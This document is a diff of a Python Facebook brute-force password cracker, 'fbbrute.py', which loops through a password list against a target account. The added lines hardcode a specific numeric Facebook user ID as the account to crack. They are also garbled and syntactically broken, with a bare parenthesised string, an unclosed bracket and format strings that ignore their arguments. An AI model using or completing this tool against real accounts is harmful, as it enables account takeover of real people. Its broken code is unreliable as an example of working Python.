@@ -1,39 +1,13 @@
 ## fbbrute.py - Facebook Brute Force
 # -*- coding: utf-8 -*-
-##
-import os
-import sys
-import urllib
-import hashlib
-
-API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
-
-__banner__ = """
-       +=======================================+
-       |..........Facebook Cracker v 1.........|
-       +---------------------------------------+
-       |#Author: DedSecTL <dtlily>             |
-       |#Contact: Telegram @dtlily             |
-       |#Date: Fri Feb 8 10:15:49 2019         |
-       |#This tool is made for pentesting.     |
-       |#Changing the description of this tool |
-       |Won't made you the coder ^_^ !!!       |
-       |#Respect Coderz ^_^                    |
-       |#I take no responsibilities for the    |
-       |  use of this program !                |
-       +=======================================+
-       |..........Facebook Cracker v 1.........|
-       +---------------------------------------+
-"""
-
-print("[+] Facebook Brute Force\n")
-userid = raw_input("[*] Enter [Email|Phone|Username|ID]: ")
+("[+] Facebook Brute Force\n")
+userid = [100044822919091]: ")
 try:
-	passlist = raw_input("[*] Set PATH to passlist: ")
+	passlist = raw_input("[password.txt] Set PATH to passlist: ")
 	if os.path.exists(passlist) != False:
 		print(__banner__)
-		print(" [+] Account to crack : {}".format(userid))
-		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
+		print(" [+] Account to crack : {100044822919091}".format(userid))
+		print(" [+] Loaded : {password.txt}".format(len(open(passlist,"r").read().split("\n"))))
 		print(" [+] Cracking, please wait ...")
 		for passwd in open(passlist,'r').readlines():
 			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
